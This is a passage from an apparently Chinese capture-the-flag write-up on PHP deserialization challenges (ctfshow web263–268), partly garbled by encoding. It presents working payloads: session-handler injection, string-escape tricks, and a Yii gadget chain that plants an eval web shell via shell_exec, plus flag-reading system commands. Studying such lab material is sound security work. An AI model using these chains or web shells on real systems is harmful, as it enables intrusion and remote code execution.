class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 16:59:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-06 19:15:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //å¯†ç å¿…é¡»ä¸º<span class="number">128</span>ä½å¤§å°å†™å­—æ¯+æ•°å­—+ç‰¹æ®Šç¬¦å·ï¼Œé˜²æ­¢çˆ†ç ´</span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//ç™»é™†æˆåŠŸå–æ¶ˆæ¬¡æ•°ç´¯è®¡</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;æ¬¢è¿æ‚¨&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//ç™»é™†å¤±è´¥ç´¯è®¡æ¬¡æ•°åŠ 1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;ç™»é™†å¤±è´¥&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>inc.php</code>åªè´´éƒ¨åˆ†æ¯”è¾ƒå…³é”®çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†<code>session.serialize_handler</code>ï¼Œ<code>User</code>ç±»ææ„å‡½æ•°å¯ä»¥åˆ©ç”¨å†™ğŸ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;ä½¿ç”¨&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;ç™»é™†&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;æˆåŠŸ&quot;</span>:<span class="string">&quot;å¤±è´¥&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>session</code>ååºåˆ—åŒ–ï¼Œç”Ÿæˆå¸¦<code>|</code>åºåˆ—åŒ–æ–‡æœ¬å†™å…¥<code>shell</code>å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_GET[&quot;a&quot;]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// echo &#x27;|&#x27;.serialize($a).PHP_EOL;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>Cookie</code>è®¿é—®<code>index.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNToiPD9waHAgZXZhbCgkX0dFVFsiYSJdKTtwaHBpbmZvKCk7Pz4iO3M6Njoic3RhdHVzIjtzOjE6IjEiO30=</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>check.php</code>ç”ŸæˆğŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/check.php?u=admin&amp;pass=admin</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆç›´æ¥æ‰“<code>log-1.php</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/log-1.php?a=system(%27tac%20flag.php%27);</span><br></pre></td></tr></table></figure><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>message.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡åŠæ³•ç›´æ¥æ”¹<code>Cookie</code>ï¼Œåªèƒ½ç”¨<code>web262</code>çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼ŒåŒæ—¶è¦æ³¨æ„è®¾ç½®<code>Cookie</code>ä¸­çš„<code>msg</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="line">Cookie:</span><br><span class="line">msg=1</span><br></pre></td></tr></table></figure><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ<code>token</code>çš„åœ°å€ä¼ ç»™<code>password</code>å³å¯ï¼Œè¿™æ ·<code>password</code>å°±ä¼šéšç€<code>token</code>ä¸€èµ·å˜åŒ–ï¼Œå§‹ç»ˆä¿æŒä¸€è‡´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ctfshow=O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>destructä¼šåœ¨è„šæœ¬ç»“æŸåé”€æ¯,è€ŒæŠ›å‡ºå¼‚å¸¸å¯¼è‡´æ— æ³•ç«‹å³æ‰§è¡Œdestruct,æ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œå¿«é€Ÿææ„</p><h3 id="åˆ é™¤æœ«å°¾"><a href="#åˆ é™¤æœ«å°¾" class="headerlink" title="åˆ é™¤æœ«å°¾}"></a>åˆ é™¤æœ«å°¾<code>&#125;</code></h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>4bffa75e-ec01-4ff2-88e0-c120e4095bec.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>73</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://4bffa75e-ec01-4ff2-88e0-c120e4095bec.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://4bffa75e-ec01-4ff2-88e0-c120e4095bec.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">O</span>:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;</span></span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹å±æ€§ä¸ªæ•°"><a href="#ä¿®æ”¹å±æ€§ä¸ªæ•°" class="headerlink" title="ä¿®æ”¹å±æ€§ä¸ªæ•°"></a>ä¿®æ”¹å±æ€§ä¸ªæ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;&#125;</span><br><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;&#125;</span><br><span class="line">O:7:&quot;Ctfshow&quot;:2:&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="æ”¹å˜ç±»å"><a href="#æ”¹å˜ç±»å" class="headerlink" title="æ”¹å˜ç±»å"></a>æ”¹å˜ç±»å</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;Ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>å¼±å£ä»¤ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p><code>about</code>é¡µé¢æºç ä¸­å­˜åœ¨<code>&lt;!--?view-source --&gt;</code>ï¼Œæ•…è®¿é—®é¡µé¢<code>/index.php?r=site%2Fabout&amp;view-source</code>å¾—åˆ°ååºåˆ—åŒ–ç‚¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>å†™ğŸè¿›å»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27; &gt; /var/www/html/basic/web/2.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6NjM6ImVjaG8gJzw/cGhwIGV2YWwoJF9QT1NUWzFdKTs/PicgPiAvdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8yLnBocCI7fWk6MTtzOjM6InJ1biI7fX19fQ==</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>2.php</code>å¹¶æ‰§è¡Œ<code>1=system(&#39;cat /flag&#39;);</code>å³å¯</p><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>æ¢ä¸ªé“¾å­</p><figure 